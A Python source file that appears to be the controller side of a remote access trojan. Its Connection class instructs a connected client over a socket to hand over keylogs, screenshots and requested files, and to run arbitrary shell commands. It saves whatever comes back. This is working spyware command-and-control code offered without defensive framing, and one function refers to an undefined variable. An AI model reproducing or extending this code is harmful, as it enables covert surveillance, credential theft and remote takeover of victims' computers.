import json
import os
import shutil
import socket
import tempfile
import time

from tqdm import tqdm

import utility


class Connection:
    def __init__(self, conn: socket.socket, cid: int, parent) -> None:
        self.conn = conn
        self.cid = cid
        self.parent = parent
        self.conn.settimeout(30)

    # communication with the client ---------------------------------------------

    def send_instruction(self, instruction: str, **kwargs) -> None:
        """sends an instruction to the client over the socket connection

        Args:
            instruction (str): instruction/command to send to the client
        """
        self.conn.send(
            json.dumps({"instruction": instruction, "arguments": kwargs}).encode(
                "utf-8"
            )
        )

    def recv_json(self) -> dict:
        """receives data from the client and converts to a JSON object

        Returns:
            dict: JSON object containing the data received from the client
        """
        # store the byte string received from the client
        data = self.conn.recv(1024)
        try:
            # attempt to decode the byte string and convert to a JSON object
            loaded = json.loads(data.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            # if the byte string cannot be loaded into a JSON object
            return None
        else:
            # if the JSON object is successfully loaded
            return loaded

    def recv_file(self, file_info: dict) -> None:
        """receives a file from the client over the socket connection

        Args:
            file_info (dict): information about the file being recieved (file type, file size, etc.)
        """
        response = {"status": False, "errors": []}
        file_name = f"{file_info['file_category']}_{int(time.time())}{file_info['file_extension']}"
        print(utility.padstring(f"Receiving {file_info['file_category']}..."))
        # initialise a temporary file to store file data during the download process
        with tempfile.TemporaryFile(mode="w+b") as tf:
            try:
                # initialise a progress bar using the tqdm module to indicate the status of the file download
                with tqdm(
                    total=file_info["file_size"],
                    unit="B",
                    unit_scale=True,
                    unit_divisor=1024,
                    ncols=100,
                ) as pb:
                    # while the target file size is not equal to the amount of data received, keep receiving data
                    while tf.tell() < file_info["file_size"]:
                        # receive data from the client connection
                        buffer = self.conn.recv(1024)
                        # if an empty byte string is received, the connection has been closed
                        if not buffer:
                            break
                        # write the recieved data to the previously created temporary file
                        tf.write(buffer)
                        # update the progress bar to reflect the status of the file download
                        pb.update(len(buffer))
            # if no data is recieved from the client within the timeout period
            except TimeoutError:
                response["errors"].append("Timeout")
            # if another connection issue occurs during the download process
            except OSError:
                response["errors"].append("ConnectionError")
            # if the download process has been completed successfully
            else:
                # if the size of the file received is what was expected

                if tf.tell() == file_info["file_size"]:
                    tf.seek(0)
                    # copy the temporary file to the specified file path, creating a permanent copy
                    with open(f"data/{file_name}", "wb") as dst:
                        shutil.copyfileobj(tf, dst)
                    # update the response to indicate the file has been successfully downloaded and saved
                    response["status"] = True
                    response["file_data"] = dict(
                        file_name=file_name, file_size=file_info["file_size"]
                    )
                else:
                    # if the size of the file received does not match the expected size
                    response["errors"].append("FileSizeMismatch")
        return response

    # handling commands ---------------------------------------------------------

    def handle_command(self, cmd: str, *args) -> str:
        """Executes a command on the client and returns the response

        Args:
            cmd (str): command to execute on the client

        Returns:
            str: response message relative to the command executed
        """
        # attempt to call the function relative to the executed command
        try:
            if cmd == "keylogs":
                response = self.keylogs()
            elif cmd == "download":
                response = self.download(args[0])
            elif cmd == "screenshot":
                response = self.screenshot()
            elif cmd == "execute":
                response = self.execute(args)
            else:
                # if the command is not recognised, return an error
                response = {"status": False, "errors": ["InvalidCommand"]}
        except OSError as e:
            # if an OS error occurs during the execution of the command
            # return an error message
            response = {"status": False, "errors": ["ConnectionError"]}
            # remove the connection from the servers list of active connections/clients
            self.parent.remove_connection(self)
        except socket.timeout:
            # if a timeout error occurs during the execution of the command
            # return an error message
            response = {"status": False, "errors": ["Timeout"]}
            # remove the connection from the servers list of active connections/clients
            self.parent.remove_connection(self)

        # if the command executed successfully
        if response["status"]:
            # return the response message
            return response["message"]
        else:
            # if the command executed unsuccessfully
            # return the error message
            return (
                response.get("message")
                or f"Failure while handling command \"{cmd}\" [Error/s: {', '.join(response['errors'])}]"
            )

    def screenshot(self) -> dict:
        """sends a request to the client to take a screenshot and recieves the screenshot

        Returns:
            dict: a response detailing the success of the screenshot request
        """
        response = {"status": False, "errors": [], "message": ""}
        # instruct the client to take and send a screenshot
        self.send_instruction(instruction="screenshot")
        # receive information about the screenshot from the client
        file_info = self.recv_json()
        if not file_info:
            response["errors"].append("InvalidFileInfo")
            return response

        # receive the screenshot from the client
        file_download_response = self.recv_file(file_info)
        if not file_download_response["status"]:
            response["errors"].append("FileDownloadError")
            return response

        # update the response to indicate the screenshot has been successfully saved
        response["status"] = True
        response[
            "message"
        ] = f"Screenshot saved as \"{file_download_response['file_data']['file_name']}\""

        return response

    def download(self, file_path: str) -> dict:
        """sends a request to the client to send a specified file and recieves the file

        Args:
            file_path (str): path of the file to be requested

        Returns:
            dict: a response detailing the success of the download request
        """
        response = {"status": False, "errors": [], "message": ""}
        # instruct the client to download a file
        self.send_instruction(instruction="download", file_path=file_path)
        # receive information about the file from the client
        file_info = self.recv_json()
        if not file_info:
            response["errors"].append("InvalidFileInfo")
            return response

        # if the file does not exist on the client, return with an error
        elif not file_info["file_exists"]:
            response["errors"].append("FileDoesNotExist")
            return response

        # receive the file from the client
        file_download_response = self.recv_file(file_info)
        if not file_download_response["status"]:
            response["errors"].append("FileDownloadError")
            return response

        # update the response to indicate the file has been successfully saved
        response["status"] = True
        response[
            "message"
        ] = f"File saved as \"{file_download_response['file_data']['file_name']}\""

        return response

    def keylogs(self) -> dict:
        """sends a request to the client to send any recorded keystrokes and recieves the keystrokes

        Returns:
            dict: a response detailing the success of the keylogs request
        """
        response = {"status": False, "errors": [], "message": ""}
        # instruct the client to send any recorded keystrokes
        self.send_instruction("keylogs")
        # receive information about the keystrokes data from the client
        file_info = self.recv_json()
        if not file_info:
            response["errors"].append("InvalidFileInfo")
            return response

        # receive the keystrokes data from the client
        file_download_response = self.recv_file(file_info)
        if not file_download_response["status"]:
            response["errors"].append("FileDownloadError")
            return response

        # update the response to indicate the keystrokes data has been successfully saved
        response["status"] = True
        response[
            "message"
        ] = f"Keylogs saved as \"{file_download_response['file_data']['file_name']}\""

        return response

    def execute(self, command: list) -> dict:
        """sends a request to the client to execute a specified shell command and return the response

        Args:
            command (list): list of command arguments to execute on the client

        Returns:
            dict: a response detailing the success of the shell command request
        """
        response = {"status": False, "errors": [], "message": ""}
        # confirm that the user wants to execute the command
        print(
            utility.padstring(
                "* Executing commands that require user-input or"
                "\ndata transfer could result in connection loss *"
            )
        )
        for i in range(3):
            confirmation = input("Are you sure you want to continue? [y/n] ")
            if confirmation.lower() == "y":
                break
            elif confirmation.lower() == "n" or i == 2:
                response[
                    "message"
                ] = f"Execution of [{' '.join(args)}] has been cancelled."
                return response

        # instruct the client to execute the command
        self.send_instruction("execute", command=command)

        # receive information about the command execution from the client
        execution_info = self.recv_json()
        if not execution_info:
            response["errors"].append("InvalidResponseInfo")
            return response

        # fetch the command output from the client
        execution_response = self.conn.recv(execution_info["output_size"])

        # update the response to indicate the command has been successfully executed

        response["status"] = True
        response["message"] = execution_response.decode("utf-8")

        return response
